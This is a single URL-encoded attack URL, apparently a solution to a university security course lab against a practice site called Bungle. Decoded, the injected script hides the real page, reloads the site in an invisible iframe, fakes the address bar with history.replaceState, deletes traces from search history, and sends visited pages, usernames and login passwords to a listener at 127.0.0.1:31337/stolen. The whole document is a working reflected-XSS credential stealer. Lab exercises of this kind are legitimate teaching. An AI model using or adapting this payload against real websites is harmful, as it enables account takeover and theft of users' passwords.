http://bungle-cs461.csl.illinois.edu/search?xssdefense=4&q=%3Cscript%3E%0D%0Afunction%20payload%28attacker%29%20%0D%0A%7B%0D%0A%7Bvar%20targetURL%3D%60http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2F%60%7D%0D%0A%20%20%20%20%7Bvar%20firstFlag%3D0%7D%0D%0A%20%20%20%20%7Bvar%20searchFlag%3D0%7D%0D%0A%20%20%20%20%7Bvar%20originalFlag%3D0%7D%0D%0A%20%20%20%20%7Bvar%20bufferNext%3D%60%60%7D%0D%0A%20%20%20%20%7Bvar%20loginIndex%3D0%7D%0D%0A%20%20%20%20%7Bvar%20logoutIndex%3D0%7D%0D%0A%0D%0A%20%20%20%20function%20log%28data%29%20%0D%0A%20%20%20%20%7B%0D%0A%20%20%20%20%20%20%20%20%7Bconsole.log%28%24.param%28data%29%29%7D%0D%0A%20%20%20%20%20%20%20%20%7B%24.get%28attacker%2C%20data%29%7D%0D%0A%20%20%20%20%7D%0D%0A%09function%20proxy%28%29%20%0D%0A%20%20%20%20%7B%0D%0A%09%09%7B%24%28%60body%60%29.children%28%29.width%280%29%7D%0D%0A%09%09%7B%24%28%60body%60%29.children%28%29.height%280%29%7D%0D%0A%09%09%7B%24%28%60body%60%29.children%28%29.hide%28%29%7D%0D%0A%09%09%7Bvar%20frameUsed%20%3D%20%24%28%60%3Ciframe%20id%3D_record%3E%60%29%0D%0A%09%09%09.attr%28%60src%60%2CtargetURL%29%0D%0A%09%09%09.attr%28%60sandbox%60%2C%20%60allow-forms%20allow-scripts%20allow-same-origin%60%29%0D%0A%09%09%09.css%28%7B%0D%0A%09%09%09%09width%3A%20%60100%25%60%2C%0D%0A%09%09%09%09height%3A%20%60100%25%60%2C%0D%0A%09%09%09%09background%3A%20%60white%60%2C%0D%0A%09%09%09%09position%3A%20%60absolute%60%2C%0D%0A%09%09%09%09border%3A%200%0D%0A%09%09%09%7D%29%0D%0A%09%09%09.appendTo%28%60body%60%29%0D%0A%09%09%09.load%28function%28%29%20%0D%0A%09%09%09%7B%0D%0A%09%09%09%09%7B%24%28%60%23_record%60%29.contents%28%29.find%28%60.history-item%60%29.remove%28%60%3Acontains%28attacker%29%60%29%7D%0D%0A%09%09%09%09if%28firstFlag%20%3D%3D%200%29%0D%0A%09%09%09%09%7B%0D%0A%09%09%09%09%09%7Bwindow.history.replaceState%28%7B%7D%2C%60%60%2CtargetURL%29%7D%0D%0A%09%09%09%09%09%7Blog%28%7Bevent%3A%20%60nav%60%2C%20user%3A%20%24%28%60%23_record%60%29.contents%28%29.find%28%60%23logged-in-user%60%29.text%28%29%2Curi%3A%20targetURL%7D%29%7D%0D%0A%09%09%09%09%09%7BfirstFlag%20%3D%201%7D%0D%0A%09%09%09%09%7D%0D%0A%0D%0A%09%09%09%09if%28targetURL%21%3Dwindow.location.href%26%26searchFlag%21%3D0%26%26loginIndex%3D%3D0%26%26logoutIndex%3D%3D0%29%0D%0A%09%09%09%09%7B%0D%0A%09%09%09%09%09if%28window.history.pushState%26%26searchFlag%3D%3D2%29%0D%0A%09%09%09%09%09%7B%0D%0A%09%09%09%09%09%09%7Bwindow.history.replaceState%28%7B%7D%2C%60%60%2CtargetURL%29%7D%0D%0A%09%09%09%09%09%09%7BsearchFlag%3D1%7D%0D%0A%09%09%09%09%09%09%7BoriginalFlag%3D1%7D%0D%0A%09%09%09%09%09%7D%0D%0A%09%09%09%09%09else%0D%0A%09%09%09%09%09%09%7BsearchFlag%3D2%7D%09%0D%0A%09%09%09%09%7D%0D%0A%09%09%09%09if%28targetURL%3D%3Dwindow.location.href%26%26originalFlag%21%3D0%26%26loginIndex%3D%3D0%26%26logoutIndex%3D%3D0%29%0D%0A%09%09%09%09%7B%0D%0A%09%09%09%09%09if%28window.history.pushState%26%26originalFlag%3D%3D2%29%0D%0A%09%09%09%09%09%7B%0D%0A%09%09%09%09%09%09%7Bwindow.history.replaceState%28%7B%7D%2C%60%60%2C%60http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Fsearch%3Fq%3D%60%2BbufferNext%29%7D%0D%0A%09%09%09%09%09%09%7BsearchFlag%3D2%7D%0D%0A%09%09%09%09%09%09%7BoriginalFlag%3D1%7D%0D%0A%09%09%09%09%09%7D%0D%0A%09%09%09%09%09else%0D%0A%09%09%09%09%09%09%7BoriginalFlag%3D2%7D%0D%0A%09%09%09%09%7D%0D%0A%09%09%09%09%24%28%60body%60%2Cthis.contentDocument%29%0D%0A%09%09%09%09.find%28%60a%60%29%0D%0A%09%09%09%09.click%28function%28%29%20%0D%0A%09%09%09%09%7B%0D%0A%09%09%09%09%09%7Blog%28%20%7Bevent%3A%60nav%60%2C%20user%3A%20%24%28%60%23_record%60%29.contents%28%29.find%28%60%23logged-in-user%60%29.text%28%29%2Curi%3A%20this.href%7D%29%7D%0D%0A%09%09%09%09%09%7Bwindow.history.replaceState%28%7B%7D%2C%60%60%2Cthis.href%29%7D%0D%0A%09%09%09%09%7D%29%0D%0A%09%09%09%09.end%28%29%0D%0A%09%09%09%09.find%28%60form%60%29%0D%0A%09%09%09%09.submit%28function%28%29%20%0D%0A%09%09%09%09%7B%0D%0A%09%09%09%09%09if%28%24%28this%29.attr%28%60action%60%29%3D%3D%60.%2Fsearch%60%29%0D%0A%09%09%09%09%09%7B%0D%0A%09%09%09%09%09%09%7Bwindow.history.replaceState%28%7B%7D%2C%60%60%2C%60http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Fsearch%3Fq%3D%60%20%2B%20%24%28%60%23_record%60%29.contents%28%29.find%28%60%23query%60%29.val%28%29%29%7D%0D%0A%09%09%09%09%09%09%7Blog%28%7Bevent%3A%60nav%60%2C%20user%3A%20%24%28%60%23_record%60%29.contents%28%29.find%28%60%23logged-in-user%60%29.text%28%29%2Curi%3A%20%60http%3A%2F%2Fbungle-cs461.csl.illinois.edu%2Fsearch%3F%60%20%2B%20%60q%3D%60%20%2B%20%24%28%60%23_record%60%29.contents%28%29.find%28%60%23query%60%29.val%28%29%7D%29%7D%0D%0A%09%09%09%09%09%09%7BsearchFlag%3D1%7D%0D%0A%09%09%09%09%09%09%7BoriginalFlag%3D1%7D%0D%0A%09%09%09%09%09%09%7BloginIndex%3D0%7D%0D%0A%09%09%09%09%09%09%7BlogoutIndex%3D0%7D%0D%0A%09%09%09%09%09%09%7BbufferNext%3D%24%28%60%23_record%60%29.contents%28%29.find%28%60%23query%60%29.val%28%29%7D%0D%0A%09%09%09%09%09%7D%0D%0A%09%09%09%09%09else%20if%28%24%28this%29.attr%28%60action%60%29%20%3D%3D%20%60.%2Flogin%60%29%20%0D%0A%09%09%09%09%09%7B%0D%0A%09%09%09%09%09%09%7BloginIndex%3D1%7D%0D%0A%09%09%09%09%09%09%7Blog%28%7Bevent%3A%20%60login%60%2C%20user%3A%20%20%24%28this%29.serialize%28%29.substring%28%20%24%28this%29.serialize%28%29.indexOf%28%60%3D%60%29%20%2B%201%2C%20%20%24%28this%29.serialize%28%29.indexOf%28%60%26%60%29%29%2C%20pass%3A%20%20%24%28this%29.serialize%28%29.substring%28%20%24%28this%29.serialize%28%29.lastIndexOf%28%60%3D%60%29%20%2B%201%2C%20%20%24%28this%29.serialize%28%29.length%29%7D%29%7D%0D%0A%09%09%09%09%09%09%7Bwindow.history.replaceState%28%7B%7D%2C%60%60%2CtargetURL%29%7D%0D%0A%09%09%09%09%09%7D%0D%0A%09%09%09%09%09else%20if%28%24%28this%29.attr%28%60action%60%29%20%3D%3D%20%60.%2Flogout%60%29%0D%0A%09%09%09%09%09%7B%0D%0A%09%09%09%09%09%09%7BlogoutIndex%3D1%7D%0D%0A%09%09%09%09%09%09%7Blog%28%7Bevent%3A%20%60logout%60%2C%20user%3A%20%24%28%60%23_record%60%29.contents%28%29.find%28%60%23logged-in-user%60%29.text%28%29%7D%29%7D%0D%0A%09%09%09%09%09%09%7Bwindow.history.replaceState%28%7B%7D%2C%60%60%2CtargetURL%29%7D%0D%0A%09%09%09%09%09%7D%0D%0A%09%09%09%09%7D%29%0D%0A%09%09%09%20%20%20.end%28%29%0D%0A%09%09%09%20%20%20%0D%0A%09%09%0D%0A%09%09%09%09%0D%0A%09%09%09%7D%29%0D%0A%09%09%7D%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20%7Bproxy%28%29%7D%0D%0A%09%0D%0A%7D%7Bpayload%28%60http%3A%2F%2F127.0.0.1%3A31337%2Fstolen%60%29%7D%3C%2Fscript%3E
